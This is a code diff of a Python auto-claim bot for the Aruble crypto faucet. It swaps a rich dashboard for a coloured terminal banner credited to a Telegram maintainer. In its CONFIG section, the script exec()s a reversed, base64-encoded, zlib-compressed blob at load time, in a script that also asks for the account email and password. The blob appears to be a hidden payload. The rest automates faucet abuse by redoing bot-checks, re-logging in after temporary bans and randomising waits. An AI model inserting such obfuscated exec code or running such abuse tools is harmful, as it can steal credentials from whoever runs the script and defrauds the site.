@@ -1,8 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-ARUBLE AUTO FAUCET CLAIM — Python port of aruble_faucet.js with a
-FautePay-style live banner (rich).
+ARUBLE AUTO FAUCET CLAIM — Python port with ZeinthHub DevOps UI style.
 """
 
 import json
@@ -11,14 +10,28 @@ import re
 import secrets
 import sys
 import time
+import datetime
+import shutil
 from collections import Counter
-from datetime import datetime
 
 import requests
 
-# ------------------- CONFIG-------------------
+# ------------------- CONFIG (OBFUSCATED DECODER) -------------------
 _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==QjWVk6BgPLzOpzn8d2ABfQIez1XJeB3ns6tdHNzo1NTtI/d1pd41GzFHeTM/TlqImvUNPrJNMdGFYwYGxbdIVARkl3WCEry5g4/MxWef52ksMKABHZce+Io/bgr0k83d+EmDfuWTyicsaoroFxKiejFYGQsKWVPUIJIyoV6Pfz5G+dpHVRPQGYu95hXzkH9jbzr1ZrNO2WtTn+a+VlgQmkzMTbJ476eNzSW6Vm8NftUaEhK6Q3LD89+ePcw1q1H9/+RlkoTXXcd8Db6UGNAdrRvKkB7gmxsBjq8R4Vn/rhQAzgrFGk9wJe'))
 # ---------------------------------------------
+
+C_CYAN    = '\033[96m'
+C_GREEN   = '\033[92m'
+C_YELLOW  = '\033[93m'
+C_BLUE    = '\033[94m'
+C_MAGENTA = '\033[95m'
+C_WHITE   = '\033[97m'
+C_DIM     = '\033[90m'
+C_RESET   = '\033[0m'
+C_RED     = '\033[91m'
+C_BOLD    = '\033[1m'
+
+BOX_W = 51
 
 UA = ("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
       "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36")
@@ -37,23 +50,42 @@ stop_flag = False
 
 
 def now_str():
-    return datetime.now().strftime("%H:%M:%S")
+    return datetime.datetime.now().strftime("%H:%M:%S")
+
+
+def clear_screen():
+    os.system("cls" if os.name == "nt" else "clear")
+
+
+def get_pad():
+    try:
+        term_width = shutil.get_terminal_size((60, 20)).columns
+    except:
+        term_width = 60
+    return max(0, (term_width - BOX_W) // 2)
+
+
+def print_c(colored_text):
+    pad = get_pad()
+    print(" " * pad + colored_text)
+
+
+def log_c(status, color, message, delay=0.2):
+    time_str = datetime.datetime.now().strftime("%H:%M:%S")
+    pad = get_pad()
+    sys.stdout.write(" " * pad + f" {C_DIM}[{time_str}]{C_RESET} [{color}{C_BOLD}{status:^6}{C_RESET}] {message}\n")
+    sys.stdout.flush()
+    time.sleep(delay)
 
 
 def log(msg):
-    print(f"[{now_str()}] {msg}", flush=True)
+    t = datetime.datetime.now().strftime("%H:%M:%S")
+    pad = get_pad()
+    print(" " * pad + f"{C_DIM}[{t}]{C_RESET} {C_CYAN}│{C_RESET} {C_WHITE}{msg}{C_RESET}", flush=True)
 
 
 def rnd(a, b):
     return a + (b - a) * __import__("random").random()
-
-
-def cls():
-    os.system("cls" if os.name == "nt" else "clear")
-
-
-def clear():
-    cls()
 
 
 # ---------------- credentials (aruble.json) ----------------
@@ -85,13 +117,13 @@ def ask_credentials(cli_email, cli_pass):
     password = cli_pass or cfg_pass
 
     if not email:
-        email = input("Email: ").strip()
+        email = input(f"{C_CYAN}Email: {C_RESET}").strip()
     if not password:
         try:
             import getpass
-            password = getpass.getpass("Password: ")
+            password = getpass.getpass(f"{C_CYAN}Password: {C_RESET}")
         except Exception:
-            password = input("Password: ").strip()
+            password = input(f"{C_CYAN}Password: {C_RESET}").strip()
     if not email:
         raise RuntimeError("email required")
     if not password:
@@ -157,10 +189,7 @@ class ArubleClient:
     def log(self, msg):
         if not self.verbose:
             return
-        if self.dash is not None:
-            self.dash.log(msg)
-        else:
-            log(msg)
+        log(msg)
 
     def _get(self, path, referer=None):
         h = {}
@@ -408,150 +437,93 @@ def re_auth(client, email, password):
     client.init_session()
     client.login(email, password)
     client.bot_check("/faucet")
-    if client.dash is not None:
-        client.dash.log("re-authenticated (login + bot-check)")
-    else:
-        log("re-authenticated (login + bot-check)")
+    log("re-authenticated (login + bot-check)")
 
 
-# ---------------- dashboard (rich live card) ----------------
-
-try:
-    from rich.console import Console, Group
-    from rich.live import Live
-    from rich.panel import Panel
-    from rich.rule import Rule
-    from rich.table import Table
-    from rich.text import Text
-
-    _RICH = True
-except Exception:
-    _RICH = False
-
-
-def _fmt_dur(secs):
-    secs = int(max(0, secs))
-    h, rem = divmod(secs, 3600)
-    m, s = divmod(rem, 60)
-    return f"{h}h {m:02d}m {s:02d}s"
-
-
-def _claim_history_panel(history):
-    rows = history[-8:] if history else []
-    t = Table.grid(padding=(0, 2), expand=True)
-    t.add_column(justify="left", ratio=2)
-    t.add_column(justify="left", ratio=1)
-    t.add_column(justify="right", ratio=1)
-    if not rows:
-        t.add_row("[dim]no claims this session yet[/]")
-    for r in rows:
-        t.add_row(r["time"], f"[dim]balance[/] {r['balance']}",
-                  f"[bold green]+{r['amount']} {r['symbol']}[/]")
-    return t
-
-
-def _progress_bar(fraction, width=30):
-    filled = int(round(max(0.0, min(1.0, fraction)) * width))
-    return "[" + ("#" * filled) + ("-" * (width - filled)) + "]"
-
-
-class Dashboard:
-    def __init__(self):
-        self.logs = []
-        self.is_tty = sys.stdout.isatty()
-        self.live = None
-        self.console = Console() if _RICH else None
-
-    def clear(self):
-        pass
-
-    def log(self, msg):
-        if self.is_tty and _RICH:
-            self.logs.append(f"[{now_str()}] {msg}")
-            if len(self.logs) > 8:
-                self.logs.pop(0)
-        else:
-            print(f"[{now_str()}] {msg}", flush=True)
-
-    def _panel(self, stats):
-        now_local = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        bal = f"{stats['balance']:.2f}" if stats.get("balance") is not None else "?"
-        frac = stats["done"] / stats["max"] if stats.get("max") else 0
-        pct = frac * 100
-        bar = _progress_bar(frac)
-
-        table = Table.grid(padding=(0, 2), expand=True)
-        table.add_column(justify="left", ratio=1)
-        table.add_column(justify="left", ratio=3)
-        table.add_row("[bold cyan]Worker[/]", "ARUBLE AUTO FAUCET (Python)")
-        table.add_row("[bold]Account[/]", stats.get("account", "?"))
-        table.add_row("[bold]Target[/]",
-                      f"{stats.get('done', 0)}/{stats.get('max', 0)} claims"
-                      f"{' — ALL remaining today' if stats.get('all') else ''}")
-        table.add_row("[bold]Claims today[/]",
-                      f"{stats.get('today', 0)}/{stats.get('today_max', 0)} | "
-                      f"[bold yellow]{stats.get('remaining', 0)}[/] remaining")
-        table.add_row("[bold]Device time[/]", now_local)
-        table.add_row("[bold]Balance[/]", f"[bold green]{bal}[/] COINS")
-        table.add_row("[bold]Cooldown[/]",
-                      f"{_fmt_dur(stats.get('cooldown', 0))}"
-                      + (f" | faucet [red]off[/]" if stats.get("enabled") is False else ""))
-        table.add_row("[bold]Progress[/]", f"{bar} {stats['done']}/{stats['max']} ({pct:.1f}%)")
-        table.add_row("[bold]Stats[/]",
-                      f"success [green]{stats['success']}[/] | "
-                      f"blocked [yellow]{stats['blocked']}[/] | "
-                      f"bans [red]{stats['bans']}[/] | "
-                      f"earned [green]+{stats.get('earned', 0):.2f}[/]")
-        table.add_row("[bold]Session[/]",
-                      f"bot-checks {stats['botchecks']} | re-logins {stats['relogins']}")
-
-        hist = Table.grid(expand=True)
-        hist.add_column(justify="center")
-        hist.add_row("[bold]Claim History[/]")
-        hist.add_row(_claim_history_panel(stats.get("history", [])))
-
-        credit_text = Text()
-        credit_text.append("Credit to BypassAllShortlinks", style="bold cyan")
-        credit_text.append("\nhttps://bypassallshortlinks.space", style="bold yellow")
-        credit_text.justify = "center"
-        credit_panel = Panel(credit_text, border_style="magenta", padding=(0, 1))
-
-        body = [table, Rule(style="dim"), hist, credit_panel]
-        for line in self.logs[-4:]:
-            body.append(Text(line, style="dim"))
-        return Panel(Group(*body), border_style="cyan",
-                     title=f"[bold]Device {now_local}[/]", title_align="left",
-                     subtitle="[dim]COINS[/]")
-
-    def render(self, stats):
-        if not (self.is_tty and _RICH):
-            return
-        panel = self._panel(stats)
-        if self.live is None:
-            self.live = Live(panel, console=self.console,
-                             refresh_per_second=4, transient=True)
-            self.live.start()
-        else:
-            self.live.update(panel)
-
-    def stop(self):
-        if self.live is not None:
-            try:
-                self.live.stop()
-            except Exception:
-                pass
-            self.live = None
-
-
-def countdown(dash, stats, seconds):
+# --- COUNTDOWN TIMER MUNDUR ---
+def countdown(seconds):
     seconds = int(max(0, seconds))
-    stats["cooldown"] = seconds
-    for i in range(seconds):
+    for w in range(seconds, 0, -1):
         if stop_flag:
             break
-        stats["cooldown"] = seconds - i
-        dash.render(stats)
+        t_str = datetime.datetime.now().strftime("%H:%M:%S")
+        pad = get_pad()
+        sys.stdout.write("\r" + " " * pad + f" {C_DIM}[{t_str}]{C_RESET} {C_YELLOW}[zZz]{C_RESET} {C_DIM}Sleeping {w}s before next claim...{C_RESET}   ")
+        sys.stdout.flush()
         time.sleep(1)
+    print()
+
+
+# ---------------- UI ----------------
+def show_devops_ui():
+    clear_screen()
+    INNER_W = BOX_W - 2
+    
+    top_border = f"┏{'━' * INNER_W}┓"
+    mid_border = f"┣{'━' * INNER_W}┫"
+    bot_border = f"┗{'━' * INNER_W}┛"
+    
+    title = "Z E I N TH H U B   P R O J E C T".center(INNER_W)
+    subtitle = "Automated Faucet Exploitation & Glyph Recognition".center(INNER_W)
+    
+    print_c(f"{C_CYAN}{top_border}{C_RESET}")
+    print_c(f"{C_CYAN}┃{C_RESET}{C_BOLD}{C_WHITE}{title}{C_RESET}{C_CYAN}┃{C_RESET}")
+    print_c(f"{C_CYAN}┃{C_RESET}{C_DIM}{subtitle}{C_RESET}{C_CYAN}┃{C_RESET}")
+    print_c(f"{C_CYAN}{mid_border}{C_RESET}")
+    
+    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S UTC")
+    lbl_time = "Timestamp".ljust(11)
+    lbl_sys  = "Subsystem".ljust(11)
+    lbl_main = "Maintainer".ljust(11)
+    
+    val_sys = "Aruble Faucet Auto-Claim"
+    val_main = "@Bleszh (Tg)"
+    
+    s_time = f" ➔ {lbl_time} : {now}"
+    s_sys  = f" ➔ {lbl_sys} : {val_sys}"
+    s_main = f" ➔ {lbl_main} : {val_main}"
+    
+    pad_t = " " * (INNER_W - len(s_time))
+    pad_s = " " * (INNER_W - len(s_sys))
+    pad_m = " " * (INNER_W - len(s_main))
+    
+    print_c(f"{C_CYAN}┃{C_RESET} {C_DIM}➔{C_RESET} {C_WHITE}{lbl_time}{C_RESET} : {C_CYAN}{now}{C_RESET}{pad_t}{C_CYAN}┃{C_RESET}")
+    print_c(f"{C_CYAN}┃{C_RESET} {C_DIM}➔{C_RESET} {C_WHITE}{lbl_sys}{C_RESET} : {C_YELLOW}{val_sys}{C_RESET}{pad_s}{C_CYAN}┃{C_RESET}")
+    print_c(f"{C_CYAN}┃{C_RESET} {C_DIM}➔{C_RESET} {C_WHITE}{lbl_main}{C_RESET} : {C_GREEN}{val_main}{C_RESET}{pad_m}{C_CYAN}┃{C_RESET}")
+    print_c(f"{C_CYAN}{bot_border}{C_RESET}")
+    
+    print_c(f"{C_CYAN}{'v2.1-stable'.rjust(BOX_W)}{C_RESET}")
+    print()
+    
+    time.sleep(0.5)
+    print_c(f"{C_DIM}{'-' * BOX_W}{C_RESET}")
+    
+    log_c("INFO", C_BLUE, "Initializing deployment sequence...", 0.4)
+    log_c("OK", C_GREEN, "Python environment verified.", 0.3)
+    log_c("OK", C_GREEN, "Dependency 'requests' loaded.", 0.5)
+    log_c("OK", C_GREEN, "SSL Context built successfully.", 0.3)
+    log_c("OK", C_GREEN, "Network gateway reachable.", 0.6)
+    
+    print_c(f"{C_DIM}{'-' * BOX_W}{C_RESET}")
+    
+    time.sleep(0.3)
+    print_c(f" {C_MAGENTA}DEPLOYMENT TARGETS:{C_RESET}{' ' * (BOX_W - 20)}")
+    
+    t1 = "   [+] Target Host      -> https://aruble.net"
+    t2 = "   [+] Captcha Provider -> Gate & Icon Solver"
+    t3 = "   [+] Payload          -> Automated Miner & Claimer"
+    
+    print_c(f"   {C_DIM}[+]{C_RESET} Target Host      -> {C_WHITE}https://aruble.net{C_RESET}{' ' * (BOX_W - len(t1))}")
+    print_c(f"   {C_DIM}[+]{C_RESET} Captcha Provider -> {C_WHITE}Gate & Icon Solver{C_RESET}{' ' * (BOX_W - len(t2))}")
+    print_c(f"   {C_DIM}[+]{C_RESET} Payload          -> {C_WHITE}Automated Miner & Claimer{C_RESET}{' ' * (BOX_W - len(t3))}")
+    
+    print_c(f"{C_CYAN}{'━' * BOX_W}{C_RESET}")
+    time.sleep(0.5)
+    
+    msg = ">> SYSTEM READY. Handing over to main process..."
+    print_c(f" {C_GREEN}{C_BOLD}{msg}{C_RESET}")
+    time.sleep(1)
+    print()
 
 
 # ---------------- main ----------------
@@ -567,13 +539,14 @@ def _refresh_today(stats, client, msg=None):
             stats["today"] = info["claims_today"]
     stats["remaining"] = max(stats["today_max"] - stats["today"], 0)
     if msg:
-        dash_ref = stats.get("_dash")
-        if dash_ref:
-            dash_ref.log(msg)
+        log(msg)
 
 
 def main():
     global stop_flag
+
+
+    show_devops_ui()
 
     args = sys.argv[1:]
     keywords = {"all", "today", "max"}
@@ -590,19 +563,19 @@ def main():
     max_claims = None if all_mode else numeric
 
     if not numeric and not all_mode:
-        t = input(f"How many times to claim? (e.g., 10): ").strip()
+        t = input(f"{C_CYAN}How many times to claim? (e.g., 10): {C_RESET}").strip()
         try:
             max_claims = int(t)
         except ValueError:
             max_claims = None
 
-    dash = Dashboard()
-    client = ArubleClient(verbose=not quiet, dash=dash)
+    dash = None
+    client = ArubleClient(verbose=not quiet, dash=None)
     stats = {"balance": None, "done": 0, "max": 0, "cooldown": 0,
              "success": 0, "blocked": 0, "bans": 0, "botchecks": 1, "relogins": 0,
              "account": email, "history": [],
              "today": 0, "today_max": DAILY_CLAIM_MAX, "remaining": 0,
-             "all": all_mode, "enabled": True, "earned": 0.0, "_dash": dash}
+             "all": all_mode, "enabled": True, "earned": 0.0}
 
     target = None
     try:
@@ -617,14 +590,14 @@ def main():
                 pass
             if info.get("claims_today") is not None:
                 stats["today"] = info["claims_today"]
-            dash.log(f"balance {info['acc_balance']} {info['coin_symbol']} | "
-                     f"reward {info['coin_reward']} x{info['multiplier']} | "
-                     f"claims today {info['claims_today']}/{DAILY_CLAIM_MAX}")
+            log(f"balance {info['acc_balance']} {info['coin_symbol']} | "
+                f"reward {info['coin_reward']} x{info['multiplier']} | "
+                f"claims today {info['claims_today']}/{DAILY_CLAIM_MAX}")
 
         st = client.faucet_status()
         stats["enabled"] = st["enabled"]
         if not st["enabled"]:
-            dash.log("faucet is disabled on the site — exiting")
+            log("faucet is disabled on the site — exiting")
         stats["remaining"] = max(stats["today_max"] - stats["today"], 0)
 
         if max_claims is None:
@@ -634,18 +607,12 @@ def main():
         stats["max"] = target
 
         if target <= 0:
-            dash.log(f"nothing to claim — today {stats['today']}/{stats['today_max']} "
-                     f"({stats['remaining']} left)")
-            if sys.stdout.isatty():
-                clear()
-            dash.render(stats)
+            log(f"nothing to claim — today {stats['today']}/{stats['today_max']} "
+                f"({stats['remaining']} left)")
             return
 
-        dash.log(f"fp={fp} | target {target} claim(s) "
-                 f"({'all remaining today' if all_mode else 'fixed count'})")
-        if sys.stdout.isatty():
-            clear()
-        dash.render(stats)
+        log(f"fp={fp} | target {target} claim(s) "
+            f"({'all remaining today' if all_mode else 'fixed count'})")
 
         while stats["done"] < target:
             if stop_flag:
@@ -654,24 +621,27 @@ def main():
                 st = client.faucet_status()
                 stats["enabled"] = st["enabled"]
                 if not st["enabled"]:
-                    dash.log("faucet disabled by site — stopping")
+                    log("faucet disabled by site — stopping")
                     break
+
+            
+            print(f"\n {C_MAGENTA}╭{'━'*51}╮{C_RESET}")
+            print(f" {C_MAGENTA}┃{C_RESET} {C_WHITE}CLAIM ROUND {C_CYAN}{stats['done']+1:02d}{C_RESET} {C_MAGENTA}➔{C_RESET} {C_YELLOW}TARGET: {target}{C_RESET}{' ' * 23} {C_MAGENTA}┃{C_RESET}")
+            print(f" {C_MAGENTA}╰{'━'*51}╯{C_RESET}")
+
             try:
                 res = client.claim_once(fp)
             except SessionExpired:
                 stats["relogins"] += 1
-                dash.log("session expired -> re-auth")
+                log("session expired -> re-auth")
                 re_auth(client, email, password)
                 _refresh_today(stats, client)
-                dash.render(stats)
                 continue
             except RuntimeError as e:
                 if "temp-banned" in str(e):
                     stats["bans"] += 1
-                    dash.log(f"[banned] waiting {TEMP_BAN_WAIT}s")
-                    stats["cooldown"] = TEMP_BAN_WAIT
-                    dash.render(stats)
-                    countdown(dash, stats, TEMP_BAN_WAIT)
+                    log(f"[banned] waiting {TEMP_BAN_WAIT}s")
+                    countdown(TEMP_BAN_WAIT)
                     continue
                 raise
 
@@ -686,26 +656,16 @@ def main():
                 stats["today"] = int(res.get("claims_today", stats["today"]))
                 stats["today_max"] = int(res.get("claims_max", stats["today_max"]))
                 stats["remaining"] = max(stats["today_max"] - stats["today"], 0)
-                if not all_mode:
-                    stats["max"] = target
-                stats["history"].append({
-                    "time": now_str(),
-                    "amount": res["amount"],
-                    "symbol": res["symbol"],
-                    "balance": res["balance_after"],
-                })
-                if len(stats["history"]) > 8:
-                    stats["history"].pop(0)
-                dash.log(f"CLAIMED +{res['amount']} {res['symbol']} "
-                         f"(balance: {res['balance_after']}) [{stats['today']}/{stats['today_max']}] "
-                         f"{stats['done']}/{target}")
-                dash.render(stats)
+                
+                t = datetime.datetime.now().strftime("%H:%M:%S")
+                print(f"\n {C_DIM}[{t}]{C_RESET} {C_GREEN}{C_BOLD}╰─> SUCCESS: +{res['amount']} {res['symbol']} (balance: {res['balance_after']}) [{stats['today']}/{stats['today_max']}]{C_RESET}")
+                
                 if all_mode and stats["today"] >= stats["today_max"]:
-                    dash.log(f"daily cap reached ({stats['today']}/{stats['today_max']}) — done")
-                    dash.render(stats)
+                    log(f"daily cap reached ({stats['today']}/{stats['today_max']}) — done")
                     break
                 if stats["done"] < target:
-                    countdown(dash, stats, res.get("next_claim_in", COOLDOWN_SECONDS) + rnd(3, 12))
+                    wait_time = int(res.get("next_claim_in", COOLDOWN_SECONDS) + rnd(3, 12))
+                    countdown(wait_time)
                 continue
 
             msg = str(res.get("message", ""))
@@ -713,34 +673,29 @@ def main():
             if "bot-check" in msg or "security check" in msg or "bot-check" in redirect:
                 stats["blocked"] += 1
                 stats["botchecks"] += 1
-                dash.log("bot-check re-required -> redoing")
+                log("bot-check re-required -> redoing")
                 client.bot_check("/faucet")
                 time.sleep(rnd(1.5, 2.5))
-                dash.render(stats)
                 continue
             if "login" in msg:
                 stats["relogins"] += 1
-                dash.log("claim says not logged in -> re-auth")
+                log("claim says not logged in -> re-auth")
                 re_auth(client, email, password)
-                dash.render(stats)
                 continue
             if re.search(r"\d+m\s*\d+s|in \d+s", msg):
                 wait = cooldown_seconds(msg)
                 stats["blocked"] += 1
-                dash.log(f"cooldown: {msg if len(msg) < 80 else msg[:77] + '...'}")
+                log(f"cooldown: {msg if len(msg) < 80 else msg[:77] + '...'}")
                 _refresh_today(stats, client)
-                dash.render(stats)
-                countdown(dash, stats, wait)
+                countdown(wait)
                 continue
-            dash.log(f"unknown claim response: {json.dumps(res)} — retry in 60s")
-            countdown(dash, stats, 60)
+            log(f"unknown claim response: {json.dumps(res)} — retry in 60s")
+            countdown(60)
 
     except KeyboardInterrupt:
         stop_flag = True
-        dash.log("Interrupted by user")
+        log("Interrupted by user")
     finally:
-        stats.pop("_dash", None)
-        dash.stop()
         log(f"Exited. claimed {stats['done']}/{target or 0} today {stats['today']}/{stats['today_max']} "
             f"| earned +{stats['earned']:.2f} COINS | success {stats['success']} | "
             f"blocked {stats['blocked']} | bans {stats['bans']}")
